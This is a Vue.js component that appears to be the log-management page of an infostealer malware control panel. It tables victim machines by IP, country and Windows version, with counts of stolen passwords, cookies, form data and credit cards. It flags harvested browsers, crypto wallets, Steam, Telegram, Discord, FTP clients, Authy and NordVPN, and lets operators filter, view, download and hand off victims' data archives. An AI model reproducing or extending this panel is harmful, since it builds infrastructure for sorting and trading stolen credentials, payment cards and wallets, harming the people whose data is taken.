<template>
  <div class="">
    <card card-body-classes="table-full-width" no-footer-line v-loading="table.isLoading">
      <h4 slot="header" class="card-title">
        Logs
        <el-tooltip class="item" effect="dark" content="Refresh" placement="top">
          <el-button  type="primary" icon="fal fa-sync" size="small"
                      class="ml-2"
                      @click="updateData()"
          >
            Refresh
          </el-button>
        </el-tooltip>
        <el-tooltip class="item" effect="dark" content="Filter" placement="top">
          <el-button  type="primary" icon="fal fa-filter" size="small" circle
                      class="float-right"
                      @click="showFilter">
          </el-button>
        </el-tooltip>
        <el-dialog  title="Filter"
                    :visible.sync="showModal"
                    width="370px"
        >
          <el-form  :model="form"
                    style="margin-top: -30px;"
                    label-position="left"
                    label-width="110px">
            <el-form-item label="Link" style="margin-top: -20px;">
              <el-input v-model="filter.filterForm.link"
                        clearable
                        size="small"
                        min-width="10"
                        placeholder="link1,link2,..."
              ></el-input>
            </el-form-item>
            <el-form-item label="UID" style="margin-top: -20px;">
              <el-input v-model="filter.filterForm.uid"
                        clearable
                        size="small"
                        min-width="10"
                        placeholder="uid1,uid,..."
              ></el-input>
            </el-form-item>
            <el-form-item label="ID" style="margin-top: -20px;">
              <el-input v-model="filter.filterForm.id"
                        clearable
                        size="small"
                        min-width="10"
                        placeholder="1,2,..."
              ></el-input>
            </el-form-item>
            <el-form-item label="IP" style="margin-top: -20px;">
              <el-input v-model="filter.filterForm.ip"
                        clearable
                        size="small"
                        min-width="10"
                        placeholder="ip1,ip2,..."
              ></el-input>
            </el-form-item>
            <el-form-item label="Comment" style="margin-top: -20px;">
              <el-input v-model="filter.filterForm.comment"
                        clearable
                        size="small"
                        min-width="10"
                        placeholder="comment1,comment2,..."
              ></el-input>
            </el-form-item>
            <el-form-item label="Country" style="margin-top: -20px;">
              <el-select  v-model="filter.filterForm.country"
                          multiple
                          collapse-tags
                          allow-create
                          filterable
                          size="small"
                          placeholder="select country">
                <el-option v-for="item in filter.countriesData"
                          :key="item.country"
                          :label="item.country"
                          :value="item.country">
                </el-option>
              </el-select>
            </el-form-item>
            <el-form-item label="Prefix" style="margin-top: -20px;">
              <el-select  v-model="filter.filterForm.prefix"
                          multiple
                          collapse-tags
                          allow-create
                          filterable
                          size="small"
                          placeholder="select prefix">
                 <el-option v-for="item in filter.prefixData"
                          :key="item.prefix"
                          :label="item.prefix"
                          :value="item.prefix">
                </el-option>
              </el-select>
            </el-form-item>
            <el-form-item label="DD group" style="margin-top: -20px;">
              <el-select  v-model="filter.filterForm.ddGroup"
                          multiple
                          collapse-tags
                          allow-create
                          filterable
                          size="small"
                          placeholder="select group">
                <el-option v-for="item in filter.ddData"
                          :key="item.group"
                          :label="item.group"
                          :value="item.group">
                </el-option>
              </el-select>
            </el-form-item>
            <el-form-item label="Soft" style="margin-top: -20px;">
              <el-select  v-model="filter.filterForm.soft"
                          multiple
                          collapse-tags
                          size="small"
                          placeholder="select soft">
                <el-option label="Chromium" value="chromium"></el-option>
                <el-option label="Gecko" value="gecko"></el-option>
                <el-option label="Edge" value="edge"></el-option>
                <el-option label="Crypto Wallet" value="wallet"></el-option>
                <el-option label="Steam" value="steam"></el-option>
                <el-option label="Telegram" value="telegram"></el-option>
                <el-option label="Discord" value="discord"></el-option>
                <el-option label="Jabber" value="jabber"></el-option>
                <el-option label="Foxmail" value="foxmail"></el-option>
                <el-option label="Outlook" value="outlook"></el-option>
                <el-option label="FileZilla" value="file_zilla"></el-option>
                <el-option label="WinSCP" value="win_scp"></el-option>
                <el-option label="Authy" value="authy"></el-option>
                <el-option label="NordVPN" value="nord_vpn"></el-option>
              </el-select>
            </el-form-item>
            <div style="margin-top: -20px;">
              <div class="row">
                <div class="col">
                  <el-checkbox v-model="filter.filterForm.onlyPasswords" label="Only Passwords"></el-checkbox>
                </div>
                <div class="col">
                  <el-checkbox v-model="filter.filterForm.onlyCookies" label="Only Cookies"></el-checkbox>
                </div>
              </div>
              <div class="row" style="margin-top: -15px;">
                <div class="col">
                  <el-checkbox v-model="filter.filterForm.onlyCC" label="Only CC"></el-checkbox>
                </div>
                <div class="col">
                  <el-checkbox v-model="filter.filterForm.onlyUnchecked" label="Only Unchecked"></el-checkbox>
                </div>
              </div>
            </div>
            <el-form-item label="Logs per page" style="margin-top: -10px;">
              <el-input-number  v-model="pagination.perPage"
                                :min="1"
                                size="mini"
              ></el-input-number>
            </el-form-item>
          </el-form>
          <span slot="footer" class="dialog-footer">
            <el-button size="small" @click="showModal = false">Cancel</el-button>
            <el-button size="small" type="primary" @click="modalSubmit">Submit</el-button>
          </span>
        </el-dialog>
      </h4>
      <div v-if="table.selectedObj.length != 0">
        <el-button class="ml-3" size="small" @click="showSelectedModal()">With selected...</el-button>
        <el-dialog  title="With selected"
                      :visible.sync="table.isShowSelectedModal"
                      width="350px"
          >
          <el-form  v-model="table.selected"
                    label-position="left"
                    label-width="110px">
            <el-form-item label="Transfer to user"
                          size="small">
              <el-select v-model="table.selected.user" placeholder="Select username" size="small" max-width="30">
                <el-option  v-for="user in users"
                            :key="user.username"
                            :label="user.username"
                            :value="user.username">
                </el-option>
              </el-select>
            </el-form-item>
            <el-form-item label="Disallow access"
                          size="small">
              <el-select v-model="table.selected.disallowUser" placeholder="Select username" size="small" max-width="30">
                <el-option  v-for="user in users"
                            :key="user.username"
                            :label="user.username"
                            :value="user.username">
                </el-option>
              </el-select>
            </el-form-item>
            <el-checkbox v-model="table.selected.createBackup" label="Create backup"></el-checkbox>
            <el-form-item v-if="table.selected.createBackup"
                          label="Comment"
                          size="small">
              <el-input v-model="table.selected.backupComment"
                        clearable
                        size="small"
                        placeholder="Backup comment">
              </el-input>
            </el-form-item>
            <el-checkbox v-model="table.selected.deleteLogs" label="Delete logs for all users"></el-checkbox>
          </el-form>
          <span slot="footer" class="dialog-footer">
              <el-button size="small" @click="table.isShowSelectedModal = false">Cancel</el-button>
              <el-button size="small" type="primary" @click="selectedModalSubmit">Submit</el-button>
            </span>
        </el-dialog>
      </div>
      <div v-if="table.data.length < 1" style="text-align: center">
        <span class="el-table__empty-text">No Data</span>
      </div>
      <div v-else>
        <el-table ref="multipleTable"
                  :data="paginate"
                  @selection-change="select"
                  class="mt-2">
          <el-table-column
            type="selection"
            >
          </el-table-column>
          <el-table-column label="#" min-width="50">
            <template slot-scope="props">
              <div style="text-align: left">
                <span>{{props.row.id}}</span>
                <br>
                <el-tag v-if="props.row.checked"
                        type="danger"
                        size="mini"
                        style="margin-left: 0px;"
                >checked</el-tag>
              </div>
            </template>
          </el-table-column>
          <el-table-column label="Info">
            <template slot-scope="props">
              <i class="fal fa-hashtag"> {{props.row.prefix}}</i>
              <br>
              <span>{{props.row.uid}}</span>
              <br>
              <i class="fab fa-windows"> {{props.row.win_ver}}</i>
              <br>
              <span>{{props.row.for_users}}</span>
            </template>
          </el-table-column>
          <el-table-column label="Data">
            <template slot-scope="props">
              <div class="row">
                <div class="col">
                  <i class="fal fa-key ml-2"> {{props.row.passwords}}</i>
                  <i class="fal fa-cookie ml-2"> {{props.row.cookies}}</i>
                  <i class="fal fa-browser ml-2"> {{props.row.forms}}</i>
                  <i class="fal fa-credit-card ml-2"> {{props.row.card}}</i>
                </div>
              </div>
              <div style="font-size: 12px;">
                <i v-if="props.row.chromium" class="fal fa-check ml-2"> Chromium</i>
                <i v-if="props.row.gecko" class="fal fa-check ml-2"> Gecko</i>
                <i v-if="props.row.edge" class="fal fa-check ml-2"> Edge</i>
                <i v-if="props.row.electrum" class="fal fa-check ml-2"> Electrum</i>
                <i v-if="props.row.multi_bit" class="fal fa-check ml-2"> MultiBit</i>
                <i v-if="props.row.armory" class="fal fa-check ml-2"> Armory</i>
                <i v-if="props.row.ethereum" class="fal fa-check ml-2"> Ethereum</i>
                <i v-if="props.row.bytecoin" class="fal fa-check ml-2"> Bytecoin</i>
                <i v-if="props.row.jaxx" class="fal fa-check ml-2"> Jaxx</i>
                <i v-if="props.row.liberty_jaxx" class="fal fa-check ml-2"> LibertyJaxx</i>
                <i v-if="props.row.atomic" class="fal fa-check ml-2"> Atomic</i>
                <i v-if="props.row.exodus" class="fal fa-check ml-2"> Exodus</i>
                <i v-if="props.row.dash_core" class="fal fa-check ml-2"> DashCore</i>
                <i v-if="props.row.bitcoin" class="fal fa-check ml-2"> Bitcoin</i>
                <i v-if="props.row.wasabi" class="fal fa-check ml-2"> Wasabi</i>
                <i v-if="props.row.daedalus" class="fal fa-check ml-2"> Daedalus</i>
                <i v-if="props.row.monero" class="fal fa-check ml-2"> Monero</i>
                <i v-if="props.row.steam" class="fal fa-check ml-2"> Steam</i>
                <i v-if="props.row.telegram" class="fal fa-check ml-2"> Telegram</i>
                <i v-if="props.row.discord" class="fal fa-check ml-2"> Discord</i>
                <i v-if="props.row.pidgin" class="fal fa-check ml-2"> Pidgin</i>
                <i v-if="props.row.psi" class="fal fa-check ml-2"> Psi</i>
                <i v-if="props.row.psi_plus" class="fal fa-check ml-2"> Psi+</i>
                <i v-if="props.row.foxmail" class="fal fa-check ml-2"> Foxmail</i>
                <i v-if="props.row.outlook" class="fal fa-check ml-2"> Outlook</i>
                <i v-if="props.row.file_zilla" class="fal fa-check ml-2"> FileZilla</i>
                <i v-if="props.row.win_scp" class="fal fa-check ml-2"> WinSCP</i>
                <i v-if="props.row.authy" class="fal fa-check ml-2"> Authy</i>
                <i v-if="props.row.nord_vpn" class="fal fa-check ml-2"> NordVPN</i>
              </div>
              <div style="font-size: 12px;">
                <span v-for="dd in props.row.detected_domains" :key="dd.domains" :style="{color: dd.color}">{{dd.domains}}, </span>
              </div>
            </template>
          </el-table-column>
          <el-table-column label="GEO">
            <template slot-scope="props">
              <span :class="'flag-icon flag-icon-'+props.row.country | lowercaseCountry"></span>
              <span class="ml-2">{{props.row.country}}</span>
              <br>
              <span class="text-muted">{{props.row.ip}}</span>
            </template>
          </el-table-column>
          <el-table-column label="Date">
            <template slot-scope="props">
              <span>{{props.row.date | timeago}}</span>
              <br>
              <span class="text-muted">{{props.row.date | toDate}}</span>
            </template>
          </el-table-column>
          <el-table-column label="Comment">
            <template slot-scope="props">
              <el-input clearable
                        value="props.row.comment"
                        v-model.lazy="props.row.comment"
                        @change="updateComment(props.row)"
                        size="small">
              </el-input>
            </template>
          </el-table-column>
          <el-table-column label="Actions">
            <template slot-scope="props">
              <div class="row">
                <div class="col-md-2">
                    <el-tooltip class="item" effect="dark" content="View" placement="top">
                    <el-button icon="fal fa-eye" circle @click="viewLog(props.row)"></el-button>
                  </el-tooltip>
                  <el-dialog  :title="'View '+ form.country+'_'+form.uid+'.zip'"
                              :visible.sync="view.showModal"
                              width="400px">
                    <div style="margin-top: -30px;" v-loading="view.isLoading">
                      <div class="mb-2" v-for="file in view.files" :key="file">
                        <el-button @click="showFile(file)" size="mini">{{file}}</el-button>
                        <br>
                      </div>
                    </div>
                    <el-dialog  :title="view.file.fileName"
                                :visible.sync="view.file.showFileModal"
                                append-to-body>
                      <div style="margin-top: -30px;" v-loading="view.file.isLoading">
                        <img v-if="view.file.fileData.screen" :src="'data:image/png;base64,'+view.file.fileData.screen" alt="">
                        <el-input v-else
                                  type="textarea"
                                  autosize
                                  v-model="view.file.fileData">
                        </el-input>
                      </div>
                    </el-dialog>
                  </el-dialog>
                </div>
                <div class="col-md-2 ml-3">
                  <el-tooltip class="item" effect="dark" content="Download" placement="top">
                    <el-button icon="fal fa-file-download" circle @click="downloadLog(props.row)"></el-button>
                  </el-tooltip>
                </div>
                <div class="col-md-2 ml-3">
                  <el-tooltip class="item" effect="dark" content="Delete" placement="top">
                    <el-button icon="fal fa-trash" type="danger" circle @click="deleteRule(props.row)"></el-button>
                  </el-tooltip>
                </div>
              </div>
            </template>
          </el-table-column>
        </el-table>
        <div slot="footer" class="col-12 d-flex justify-content-center justify-content-sm-between flex-wrap mt-3">
          <p class="text-muted">Total {{table.data.length}} logs</p>
          <pagination class="pagination-primary"
                        v-model="pagination.currentPage"
                        :per-page="pagination.perPage"
                        :total="table.data.length"/>
          <p class="text-muted">Showing {{from}}-{{to}} logs</p>
        </div>
      </div>
    </card>
  </div>
</template>

<script>
import { Pagination, Card } from 'src/components';
import store from 'src/store'

export default {
  components: {
    Pagination,
    Card
  },
  data() {
    return {
      users: [],
      table: {
        isLoading: true,
        data: [],
        isShowSelectedModal: false,
        selectedObj: [],
        selected: {
          uid: [],
          user: [],
          disallowUser: [],
          backupComment: '',
          deleteLogs: false,
        },
      },
      pagination: {
        perPage: 10,
        currentPage: 1,
      },
      showModal: false,
      form: {
        id: 0,
        for_users: '',
        checked: false,
        prefix: '',
        win_ver: '',
        date: 0,
        ip: '',
        country: '',
        passwords: 0,
        cookies: 0,
        cards: 0,
        forms: 0,
        history: false,
        domains: '',
        detected_domains: [],
        comment: '',
        crypto_wallet: false,
        steam: false,
        battle_net: false,
        telegram: false,
        discord: false,
        skype: false,
        jabber: false,
        foxmail: false,
        outlook: false,
        file_zilla: false,
        win_ftp: false,
        win_scp: false,
        authy: false,
        nord_vpn: false,
      },
      filter: {
        countriesData: null,
        prefixData: null,
        ddData: null,
        filterForm: {},
      },
      view: {
        showModal: false,
        isLoading: false,
        files: [],
        file: {
          showFileModal: false,
          isLoading: false,
          fileName: '',
          fileData: '',
        }
      },
    }
  },
  filters: {
    lowercaseCountry(data) {
      return data.toLowerCase();
    },
    timeago(timeStamp) {
      const diff = Math.round(+new Date()/1000) - timeStamp
      const msPerMinute = 60;
      const msPerHour = msPerMinute * 60;
      const msPerDay = msPerHour * 24;
      const msPerMonth = msPerDay * 30;
      const msPerYear = msPerDay * 365;

      if (diff < msPerMinute) {
          return Math.round(diff) + 's ago';
      }
      else if (diff < msPerHour) {
          return Math.round(diff/msPerMinute) + 'm ago';
      }
      else if (diff < msPerDay) {
          return Math.round(diff/msPerHour) + 'h ago';
      }
      else if (diff < msPerMonth) {
          return Math.round(diff/msPerDay) + 'd ago';
      }
      else if (diff < msPerYear) {
          return Math.round(diff/msPerMonth) + ' months ago';
      }
      else {
          return Math.round(diff/msPerYear) + ' years ago';
      }
    },
    toDate(timestamp) {
      var date_ob = new Date(timestamp*1000);
      var hours = ("0" + date_ob.getHours()).slice(-2);
      var minutes = ("0" + date_ob.getMinutes()).slice(-2);
      var seconds = ("0" + date_ob.getSeconds()).slice(-2);
      var date = ("0" + date_ob.getDate()).slice(-2);
      var month = ("0" + (date_ob.getMonth() + 1)).slice(-2);
      var year = date_ob.getFullYear();
      return date+'.'+month+'.'+year+' '+hours+':'+minutes+':'+seconds;
    }
  },
  async mounted() {
    this.table.isLoading = true;
    if (!this.$store.getters.LOGS_DATA.length) {
      await this.updateData();
    } else {
      this.table.data = this.$store.getters.LOGS_DATA;
    }
    this.table.isLoading = false;
  },
  computed: {
    from() {
      return this.pagination.perPage * (this.pagination.currentPage - 1);
    },
    to() {
      let highBound = this.from + this.pagination.perPage;
      if (this.table.data.length < highBound) {
        highBound = this.table.data.length;
      }
      return highBound;
    },
    paginate() {
      let result = this.table.data;
      if (this.table.data.length > 0) {
        result = this.table.data;
      }
      return result.slice(this.from, this.to);
    },
  },
  methods: {
    async updateData() {
      this.table.isLoading = true;
      await this.$store.dispatch('GET_LOGS_DATA');
      this.table.isLoading = false;
      this.table.data = this.$store.getters.LOGS_DATA;
    },
    async updateComment(row) {
      this.form.uid = row.uid;
      this.form.comment = row.comment;
      await this.$store.dispatch('SET_LOG_COMMENT', this.form);
      const err = this.$store.getters.GET_LAST_ERROR;
      if (!err) {
        this.$notify.success({title: 'Success', message: 'Comment updated success!', duration:3000});
      } else {
        this.$notify.error({title: 'Error', message: err, duration:3000});
        this.$store.commit('SET_LAST_ERROR', null);
      }
    },
    async deleteRule(row) {
      this.form.id = row.id;
      await this.$store.dispatch('DEL_LOG', this.form);
      const err = this.$store.getters.GET_LAST_ERROR;
      if (!err) {
        this.$notify.success({title: 'Success', message: 'Log deleted success!', duration:3000});
      } else {
        this.$notify.error({title: 'Error', message: err, duration:3000});
        this.$store.commit('SET_LAST_ERROR', null);
      }

      const index = this.table.data.indexOf(row);
      if (index != -1) {
        this.table.data.splice(index, 1);
      }
    },
    async showFilter() {
      this.table.isLoading = true;
      if (!this.$store.getters.COUNTRIES_DATA) {
        await this.$store.dispatch('GET_COUNTRIES_DATA');
      }
      this.filter.countriesData = this.$store.getters.COUNTRIES_DATA;

      if (!this.$store.getters.PREFIX_DATA) {
        await this.$store.dispatch('GET_PREFIX_DATA');
      }
      this.filter.prefixData = this.$store.getters.PREFIX_DATA;

      if (!this.$store.getters.DD_DATA) {
        await this.$store.dispatch('GET_DD_DATA');
      }
      this.filter.ddData = this.$store.getters.DD_DATA;
      
      this.table.isLoading = false;
      this.showModal = true;
    },
    async modalSubmit() {
      this.showModal = false;
      this.table.isLoading = true;
      await this.$store.dispatch('FILTER_LOGS', this.filter.filterForm);
      this.table.data = this.$store.getters.LOGS_DATA;
      this.table.isLoading = false;
    },
    select(val) {
      this.table.selectedObj = val;
    },
    async showSelectedModal()
    {
      this.table.selected.user = '';
      this.table.selected.disallowUser = '';
      this.table.selected.backupComment = '';
      this.table.selected.deleteLogs = false;

      if (!this.$store.getters.USERS_DATA.length) {
        await this.$store.dispatch('GET_USERS_DATA');
      }
      this.users = this.$store.getters.USERS_DATA;
      this.table.isShowSelectedModal = true;
    },
    async selectedModalSubmit() {
      this.table.isShowSelectedModal = false;
      for (var i = 0; i < this.table.selectedObj.length; i++) {
        this.table.selected.uid[i] = this.table.selectedObj[i].uid;
      }
      this.table.selectedObj = [];

      this.table.isLoading = true;
      await this.$store.dispatch('SELECTED_LOGS_ACTION', this.table.selected);
      this.table.isLoading = false;
      const err = this.$store.getters.GET_LAST_ERROR;
      if (!err) {
        this.$notify.success({title: 'Success', message: 'Action completed success!', duration:3000});
      } else {
        this.$notify.error({title: 'Error', message: err, duration:3000});
        this.$store.commit('SET_LAST_ERROR', null);
      }
      await this.updateData();
    },
    async downloadLog(row) {
      this.form.uid = row.uid;
      this.form.country = row.country;
      this.$store.dispatch('DOWNLOAD_LOG', this.form);
      this.$notify.success({title: 'Success', message: 'Downloading started in background, please wait', duration:3000});
    },
    async viewLog(row) {
      this.view.showModal = true;
      this.form.country = row.country
      this.form.uid = row.uid;
      this.view.isLoading = true;
      await this.$store.dispatch('GET_LOG_TREE', this.form);
      this.view.files  = this.$store.getters.LOG_TREE;
      this.view.isLoading = false;
    },
    async showFile(fileName) {
      this.view.file.fileData = '';
      this.view.file.showFileModal = true;
      this.view.file.fileName = fileName;
      fileName = fileName.replace('/', '*');
      this.view.file.isLoading = true;
      await this.$store.dispatch('GET_FILE_DATA', fileName);
      this.view.file.fileData  = this.$store.getters.FILE_DATA;
      this.view.file.isLoading = false;
    }
  }
}
</script>

<style>
.text-muted {
    color: #70657b !important;
    font-size: 12px;
}
</style>
